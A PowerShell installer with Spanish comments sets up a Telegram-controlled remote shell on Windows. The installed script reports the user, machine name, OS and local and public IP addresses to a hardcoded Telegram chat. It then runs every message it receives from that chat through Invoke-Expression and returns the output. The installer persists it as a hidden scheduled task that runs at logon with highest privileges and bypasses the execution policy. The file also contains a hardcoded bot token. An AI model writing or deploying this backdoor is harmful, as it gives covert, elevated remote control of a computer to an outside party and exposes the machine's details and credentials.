# 1. Definir rutas y variables
$dirPath = "C:\Scripts\TelegramBot"
$scriptPath = "$dirPath\TelegramControl.ps1"
$taskName = "TelegramControlBot"

if (-not (Test-Path $dirPath)) {
    New-Item -ItemType Directory -Path $dirPath -Force | Out-Null
}

# 2. Generar el script corregido del Bot
$botCode = @'
$token = "9266408430:AAECrZsMlV1CBNuWKkLFVDeOv3GKEPlx9tQ"
$allowedChatId = "8510211294"

# Función auxiliar para enviar mensajes de texto de forma segura
function Send-TelegramMessage {
    param([string]$text)
    try {
        if ($text.Length -gt 4000) {
            $text = $text.Substring(0, 4000) + "`n... [Salida truncada]"
        }
        $body = @{
            chat_id = $allowedChatId
            text    = $text
        }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" -Method Post -Body $body | Out-Null
    } catch {}
}

# --- 1. NOTIFICACIÓN AL INICIAR EL EQUIPO ---
try {
    $pcName = $env:COMPUTERNAME
    $user = $env:USERNAME
    $osInfo = (Get-CimInstance Win32_OperatingSystem).Caption
    $bootTime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime.ToString("dd/MM/yyyy HH:mm:ss")
    
    $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.IPAddress -notlike "169.254*" } | Select-Object -First 1).IPAddress
    if (-not $ipLocal) { $ipLocal = "No detectada" }

    try {
        $ipPublic = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5).Trim()
    } catch {
        $ipPublic = "No disponible"
    }

    $startMsg = "🖥️ EQUIPO ENCENDIDO`n`n" +
                "👤 Usuario: $user`n" +
                "💻 Equipo: $pcName`n" +
                "💿 Sistema: $osInfo`n" +
                "🌐 IP Local: $ipLocal`n" +
                "🌍 IP Pública: $ipPublic`n" +
                "⏰ Arranque: $bootTime`n`n" +
                "✅ Bot listo para recibir comandos."

    Send-TelegramMessage -text $startMsg
} catch {}

# --- 2. ESCUCHA Y EJECUCIÓN DE COMANDOS ---
$offset = 0
while ($true) {
    try {
        $url = "https://api.telegram.org/bot$token/getUpdates?offset=$offset&timeout=20"
        $response = Invoke-RestMethod -Uri $url -Method Get

        foreach ($update in $response.result) {
            $offset = $update.update_id + 1
            $chatId = [string]$update.message.chat.id
            $command = $update.message.text

            if ($chatId -eq $allowedChatId -and -not [string]::IsNullOrWhiteSpace($command)) {
                # AVISO 1: Confirmar recepción inmediatamente
                Send-TelegramMessage -text "⏳ Recibido, ejecutando: $command"

                # AVISO 2: Ejecutar comando y capturar resultado
                try {
                    $result = Invoke-Expression -Command $command 2>&1 | Out-String
                    if ([string]::IsNullOrWhiteSpace($result)) {
                        $result = "✅ Comando ejecutado con éxito (sin respuesta de texto)."
                    }
                } catch {
                    $result = "❌ Error al ejecutar:`n$_"
                }

                # AVISO 3: Enviar el resultado del comando
                Send-TelegramMessage -text $result
            }
        }
    } catch {
        Start-Sleep -Seconds 5
    }
}
'@

# 3. Guardar script en disco
Set-Content -Path $scriptPath -Value $botCode -Encoding UTF8

# 4. Crear tarea programada en segundo plano con derechos de Administrador
schtasks /End /TN $taskName 2>$null | Out-Null
$actionArg = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
schtasks /Create /TN $taskName /TR "powershell.exe $actionArg" /SC ONLOGON /RL HIGHEST /F | Out-Null
schtasks /Run /TN $taskName | Out-Null

Write-Host " Servicio configurado y ejecutándose en segundo plano con permisos de Administrador." -ForegroundColor Green
